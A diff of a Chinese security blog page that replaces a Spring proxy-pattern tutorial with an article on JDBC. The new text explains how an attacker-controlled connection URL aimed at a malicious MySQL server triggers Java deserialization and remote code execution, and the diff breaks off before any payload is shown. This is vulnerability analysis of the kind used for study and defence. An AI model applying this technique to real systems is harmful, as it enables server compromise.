@@ -10,14 +10,14 @@
       
       
       
-        <link rel="canonical" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/">
+        <link rel="canonical" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/JDBC/">
       
       <link rel="icon" href="../../../../attachment/favicon.ico">
       <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.2.4">
     
     
       
-        <title>代理模式 - Longlone's Blog</title>
+        <title>JDBC - Longlone's Blog</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#代理模式" class="md-skip">
+        <a href="#jdbc" class="md-skip">
           跳转至
         </a>
       
@@ -93,7 +93,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              代理模式
+              JDBC
             
           </span>
         </div>
@@ -811,12 +811,14 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_3" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" checked>
       
       
       
@@ -837,11 +839,107 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/JDBC/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          JDBC
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         JDBC
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#什么是jdbc" class="md-nav__link">
+    什么是JDBC
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jdbc反序列化漏洞简介" class="md-nav__link">
+    JDBC反序列化漏洞简介
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jdbc反序列化漏洞分析" class="md-nav__link">
+    JDBC反序列化漏洞分析
+  </a>
+  
+    <nav class="md-nav" aria-label="JDBC反序列化漏洞分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#serverstatusdiffinterceptor触发方式" class="md-nav__link">
+    ServerStatusDiffInterceptor触发方式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#detectcustomcollations触发方式" class="md-nav__link">
+    detectCustomCollations触发方式
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#利用方式" class="md-nav__link">
+    利用方式
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#各个版本payload总结" class="md-nav__link">
+    各个版本payload总结
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#参考文章" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -853,7 +951,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/JNDI/" class="md-nav__link">
+      <a href="../JNDI/" class="md-nav__link">
         JNDI
       </a>
     </li>
@@ -867,7 +965,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/JRMP/" class="md-nav__link">
+      <a href="../JRMP/" class="md-nav__link">
         JRMP
       </a>
     </li>
@@ -881,7 +979,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/RMI/" class="md-nav__link">
+      <a href="../RMI/" class="md-nav__link">
         RMI
       </a>
     </li>
@@ -921,7 +1019,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/" class="md-nav__link">
+      <a href="../%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/" class="md-nav__link">
         Tomcat-Filter型内存马
       </a>
     </li>
@@ -935,7 +1033,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/" class="md-nav__link">
+      <a href="../%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/" class="md-nav__link">
         Tomcat-Listener型内存马
       </a>
     </li>
@@ -949,7 +1047,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/" class="md-nav__link">
+      <a href="../%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/" class="md-nav__link">
         Tomcat-Servlet型内存马
       </a>
     </li>
@@ -963,7 +1061,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/" class="md-nav__link">
+      <a href="../%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/" class="md-nav__link">
         Tomcat-Valve型内存马
       </a>
     </li>
@@ -1010,7 +1108,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../java%E5%AE%89%E5%85%A8/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/" class="md-nav__link">
+      <a href="../%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/fastjson/" class="md-nav__link">
         fastjson
       </a>
     </li>
@@ -1036,14 +1134,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_4" type="checkbox" id="__nav_3_2_4" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_4" data-md-state="indeterminate" type="checkbox" id="__nav_3_2_4" checked>
       
       
       
@@ -1066,7 +1162,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../AOP/" class="md-nav__link">
+      <a href="../../spring/AOP/" class="md-nav__link">
         AOP
       </a>
     </li>
@@ -1080,7 +1176,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/" class="md-nav__link">
+      <a href="../../spring/Bean%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/" class="md-nav__link">
         Bean的作用域
       </a>
     </li>
@@ -1094,7 +1190,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Bean%E7%9A%84%E8%A3%85%E9%85%8D/" class="md-nav__link">
+      <a href="../../spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/" class="md-nav__link">
         Bean的装配
       </a>
     </li>
@@ -1108,7 +1204,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../HelloSpring/" class="md-nav__link">
+      <a href="../../spring/HelloSpring/" class="md-nav__link">
         HelloSpring
       </a>
     </li>
@@ -1122,7 +1218,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/" class="md-nav__link">
         Spring中使用java代码配置
       </a>
     </li>
@@ -1136,7 +1232,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+      <a href="../../spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/" class="md-nav__link">
         Spring中使用注解配置
       </a>
     </li>
@@ -1150,7 +1246,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/" class="md-nav__link">
+      <a href="../../spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/" class="md-nav__link">
         Spring使用XML配置
       </a>
     </li>
@@ -1164,7 +1260,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Spring%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+      <a href="../../spring/Spring%E7%AE%80%E4%BB%8B/" class="md-nav__link">
         Spring简介
       </a>
     </li>
@@ -1176,120 +1272,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          代理模式
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../spring/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/" class="md-nav__link">
         代理模式
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#为什么要学习代理模式" class="md-nav__link">
-    为什么要学习代理模式
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#代理模式的分类" class="md-nav__link">
-    代理模式的分类
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#静态代理" class="md-nav__link">
-    静态代理
-  </a>
-  
-    <nav class="md-nav" aria-label="静态代理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#实例代码" class="md-nav__link">
-    实例代码
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#代理模式的特点" class="md-nav__link">
-    代理模式的特点
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#动态代理" class="md-nav__link">
-    动态代理
-  </a>
-  
-    <nav class="md-nav" aria-label="动态代理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#实例代码_1" class="md-nav__link">
-    实例代码
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#代理模式和装饰器模式的区别" class="md-nav__link">
-    代理模式和装饰器模式的区别
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#总结" class="md-nav__link">
-    总结
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1301,7 +1288,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/" class="md-nav__link">
+      <a href="../../spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/" class="md-nav__link">
         依赖注入(DI)
       </a>
     </li>
@@ -1315,7 +1302,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/" class="md-nav__link">
+      <a href="../../spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/" class="md-nav__link">
         控制反转(IOC)
       </a>
     </li>
@@ -2003,8 +1990,8 @@
                 #java&nbsp;
             </a>
         
-            <a href = "/tags.html#spring" title="spring" class="md-tag">
-                #spring&nbsp;
+            <a href = "/tags.html#java安全" title="java安全" class="md-tag">
+                #java安全&nbsp;
             </a>
         
     
@@ -2024,168 +2011,118 @@
       
     
       
-        <span class="md-tag">spring</span>
+        <span class="md-tag">java安全</span>
       
     
   </nav>
 
 
 
-<h1 id="代理模式">代理模式<a class="headerlink" href="#代理模式" title="Permanent link">#</a></h1>
-<p><img alt="" src="https://gitee.com/guuest/images/raw/master/img/20210729101504.png" /></p>
-<h2 id="为什么要学习代理模式">为什么要学习代理模式<a class="headerlink" href="#为什么要学习代理模式" title="Permanent link">#</a></h2>
-<p>代理模式是SpringAOP的底层</p>
-<h2 id="代理模式的分类">代理模式的分类<a class="headerlink" href="#代理模式的分类" title="Permanent link">#</a></h2>
-<ul>
-<li>静态代理</li>
-<li>动态代理</li>
-</ul>
-<h2 id="静态代理">静态代理<a class="headerlink" href="#静态代理" title="Permanent link">#</a></h2>
-<p>角色分析<br />
-- 抽象接口:真实类和代理类都要实现的接口<br />
-- 真实类:被代理的类<br />
-- 代理类:代理真实类，一般代理后会有一些附属操作<br />
-- 客户类:访问代理类</p>
-<h3 id="实例代码">实例代码<a class="headerlink" href="#实例代码" title="Permanent link">#</a></h3>
-<p><div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
+<h1 id="jdbc">JDBC<a class="headerlink" href="#jdbc" title="Permanent link">#</a></h1>
+<h2 id="什么是jdbc">什么是JDBC<a class="headerlink" href="#什么是jdbc" title="Permanent link">#</a></h2>
+<blockquote>
+<p>JDBC一般指Java数据库连接。Java数据库连接，（Java Data Base Connectivity，简称JDBC）<br />
+是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。JDBC提供了一种基准，据此可以构建更高级的工具和接口，使数据库开发人员能够编写数据库应用程序。</p>
+</blockquote>
+<p><img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303103911.png" /><br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303103920.png" /></p>
+<p>一个简单的示例如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">java.sql.*</span><span class="p">;</span>
 
-<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Rent</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rent</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></div><br />
-<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Landlord</span> <span class="kd">implements</span> <span class="n">Rent</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rent</span><span class="p">(){</span>
-        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;租房子&quot;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="err">````</span>
-<span class="err">```</span><span class="n">java</span>
-<span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LandlordProxy</span> <span class="kd">implements</span> <span class="n">Rent</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="n">Rent</span> <span class="n">landlord</span><span class="p">;</span>
-
-    <span class="kd">public</span> <span class="nf">LandlordProxy</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">this</span><span class="p">.</span><span class="na">landlord</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Landlord</span><span class="p">();</span>
-    <span class="p">}</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rent</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">this</span><span class="p">.</span><span class="na">landlord</span><span class="p">.</span><span class="na">rent</span><span class="p">();</span>
-        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;收中介费&quot;</span><span class="p">);</span>
-    <span class="p">}</span>
-
-<span class="p">}</span>
-<span class="err">````</span>
-<span class="err">```</span><span class="n">java</span>
-<span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">Rent</span> <span class="n">landlordProxy</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LandlordProxy</span><span class="p">();</span>
-        <span class="n">landlordProxy</span><span class="p">.</span><span class="na">rent</span><span class="p">();</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span><span class="p">,</span> <span class="n">SQLException</span> <span class="p">{</span>
+        <span class="n">String</span> <span class="n">Driver</span> <span class="o">=</span> <span class="s">&quot;com.mysql.cj.jdbc.Driver&quot;</span><span class="p">;</span>
+        <span class="n">String</span> <span class="n">DB_URL</span> <span class="o">=</span> <span class="s">&quot;jdbc:mysql://127.0.0.1:3306/test?serverTimezone=UTC&quot;</span><span class="p">;</span>
+        <span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">Driver</span><span class="p">);</span>
+        <span class="c1">// 连接数据库</span>
+        <span class="n">Connection</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">DB_URL</span><span class="p">,</span> <span class="s">&quot;root&quot;</span><span class="p">,</span> <span class="s">&quot;root&quot;</span><span class="p">);</span>
+        <span class="c1">// 操作数据库</span>
+        <span class="n">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="na">createStatement</span><span class="p">();</span>
+        <span class="n">ResultSet</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">stmt</span><span class="p">.</span><span class="na">executeQuery</span><span class="p">(</span><span class="s">&quot;SELECT * FROM users&quot;</span><span class="p">);</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">next</span><span class="p">())</span> <span class="p">{</span>
+            <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot; : &quot;</span> <span class="o">+</span> <span class="n">rs</span><span class="p">.</span><span class="na">getString</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">));</span>
+        <span class="p">}</span>
     <span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div></p>
-<h3 id="代理模式的特点">代理模式的特点<a class="headerlink" href="#代理模式的特点" title="Permanent link">#</a></h3>
-<p>优点:<br />
-- 可以使真实类更加纯粹，不再需要关注一些公共服务<br />
-- 实现公共服务交给代理角色，实现了业务分工<br />
-- 客户类只能访问到代理类，隐藏了真实类<br />
-- 方便扩展和集中管理<br />
-缺点:<br />
-- 代理类和真实类的关系在编译时确定，所以一个真实类就需要一个代理类</p>
-<h2 id="动态代理">动态代理<a class="headerlink" href="#动态代理" title="Permanent link">#</a></h2>
-<p>动态代理分为两类:基于接口的动态代理和基于类的动态代理<br />
-- 基于接口: JDK动态代理<br />
-- 基于类: cglib<br />
-- java字节码实现: javasist</p>
-<p><strong>这里先了解JDK自带的动态代理</strong><br />
-需要了解2个类:<br />
-- <code>Proxy</code>:用于创建代理类的类<br />
-- <code>InvocationHandler</code>:代理实例调用方法时的一个接口，通过在invoke方法里编写额外代码实现附属功能</p>
-<h3 id="实例代码_1">实例代码<a class="headerlink" href="#实例代码_1" title="Permanent link">#</a></h3>
-<p><div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="c1">// 抽象接口，抽象出rent这个方法</span>
-<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Rent</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rent</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></div><br />
-<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="c1">// 真实类，实现了rent方法</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Landlord</span> <span class="kd">implements</span> <span class="n">Rent</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">rent</span><span class="p">(){</span>
-        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;租房子&quot;</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><br />
-<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span>
-<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="p">;</span>
-<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span>
-
-<span class="c1">// 这里将Porxy和InvocationHandler合二为一</span>
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LandlordInvocationHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="p">{</span>
-    <span class="c1">//真实类的实例，即被代理的实例</span>
-    <span class="kd">private</span> <span class="n">Object</span> <span class="n">obj</span><span class="p">;</span>
-
-    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObj</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="n">obj</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setObj</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">this</span><span class="p">.</span><span class="na">obj</span> <span class="o">=</span> <span class="n">obj</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="kd">public</span> <span class="nf">LandlordInvocationHandler</span><span class="p">()</span> <span class="p">{</span>
-    <span class="p">}</span>
-
-    <span class="kd">public</span> <span class="nf">LandlordInvocationHandler</span><span class="p">(</span><span class="n">Object</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">this</span><span class="p">.</span><span class="na">obj</span> <span class="o">=</span> <span class="n">obj</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="c1">// 获取代理类</span>
-       <span class="kd">public</span> <span class="n">Rent</span> <span class="nf">getProxy</span><span class="p">()</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="p">(</span><span class="n">Rent</span><span class="p">)</span> <span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">(),</span> <span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getInterfaces</span><span class="p">(),</span> <span class="k">this</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="c1">// 重写InvocationHandler的invoke方法，在调用Rent接口的任何方法前前增加一句输出</span>
-    <span class="nd">@Override</span>
-    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="p">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="p">,</span> <span class="n">Method</span> <span class="n">method</span><span class="p">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="p">{</span>
-        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Running method: &quot;</span> <span class="o">+</span> <span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span>
-        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
-        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div><br />
-<div class="highlight"><pre><span></span><code><span class="kn">package</span> <span class="nn">top.longlone</span><span class="p">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Client</span> <span class="p">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// 创建真实类的实例，即被代理的实例</span>
-        <span class="n">Landlord</span> <span class="n">landlord</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Landlord</span><span class="p">();</span>
-        <span class="c1">// 创建自己编写的InvocationHandler，并传入被代理的实例</span>
-        <span class="n">LandlordInvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LandlordInvocationHandler</span><span class="p">(</span><span class="n">landlord</span><span class="p">);</span>
-        <span class="c1">// 获取代理类</span>
-        <span class="n">Rent</span> <span class="n">landlordProxy</span> <span class="o">=</span> <span class="n">handler</span><span class="p">.</span><span class="na">getProxy</span><span class="p">();</span>
-        <span class="c1">// 调用代理类的rent方法</span>
-        <span class="n">landlordProxy</span><span class="p">.</span><span class="na">rent</span><span class="p">();</span>
-        <span class="cm">/* Output:</span>
-<span class="cm">        Running method: rent</span>
-<span class="cm">        租房子</span>
-<span class="cm">        */</span>
-    <span class="p">}</span>
-<span class="p">}</span>
+<h2 id="jdbc反序列化漏洞简介">JDBC反序列化漏洞简介<a class="headerlink" href="#jdbc反序列化漏洞简介" title="Permanent link">#</a></h2>
+<p>如果攻击者能够控制JDBC连接设置项(即上面示例中的<code>DB_URL</code>)，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。</p>
+<p>具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。</p>
+<p>可被利用的两条查询语句：<br />
+-   SHOW SESSION STATUS<br />
+-   SHOW COLLATION</p>
+<h2 id="jdbc反序列化漏洞分析">JDBC反序列化漏洞分析<a class="headerlink" href="#jdbc反序列化漏洞分析" title="Permanent link">#</a></h2>
+<p>反序列化点(<code>readObject()</code>)在<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>的<code>public Object getObject(int columnIndex)</code>的<code>switch</code>条件语句中，存在两处反序列化点，一处是<code>case BIT</code>，另一处是<code>case BLOB</code>:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303111234.png" /></p>
+<p><img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303111318.png" /></p>
+<p>那么我们就需要了解一下<code>getObject()</code>方法的作用，参考<a href="[https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-type-conversions.html](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-type-conversions.html)">jdbc的文档</a></p>
+<blockquote>
+<p><code>ResultSet.getObject()</code>方法是用于MySQL和Java类型之间的类型转换</p>
+</blockquote>
+<p>而其中<code>BIT</code>和<code>BLOB</code>就是MySQL里的一种数据格式，也就是说如果我们数据中返回了<code>BIT</code>或者<code>BLOB</code>类型的数据，jdbc会尝试将其反序列化为java对象，这里就可能存在反序列化漏洞。</p>
+<p>我们再来了解一下<code>BIT</code>和<code>BLOB</code>这两种MYSQL的数据格式:<br />
+<code>BLOB</code>：</p>
+<blockquote>
+<p><code>BLOB</code>为二进制形式的长文本数据，大小是0-65535 bytes</p>
+</blockquote>
+<p><code>BIT</code>：</p>
+<blockquote>
+<p>Bit数据类型用来存储bit值 BIT(M)代表可以存储M个bit，M的取值范围为1到64 如果手工指定bit值，则可以使用b'value'格式，比如b'111'和 b'10000000'分别代表7和128</p>
+</blockquote>
+<p>根据上面的介绍，我们将重点放在了BLOB这个数据格式，再分析一下代码逻辑，先获取结果集中的一列，判断其的mysql数据类型:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303112147.png" /></p>
+<p>接下来是判断几个条件: <br />
+1. filed是binary或者blob<br />
+2. 配置中的autoDeserialize为<code>true</code><br />
+3. <code>data</code>满足第一位为<code>-84</code>第二位为<code>-19</code>，实际上为java序列化对象魔术头: <code>AC(0xAC == 256 - 84) ED(0xED == 256 - 19)</code><br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20220303112313.png" /></p>
+<h3 id="serverstatusdiffinterceptor触发方式">ServerStatusDiffInterceptor触发方式<a class="headerlink" href="#serverstatusdiffinterceptor触发方式" title="Permanent link">#</a></h3>
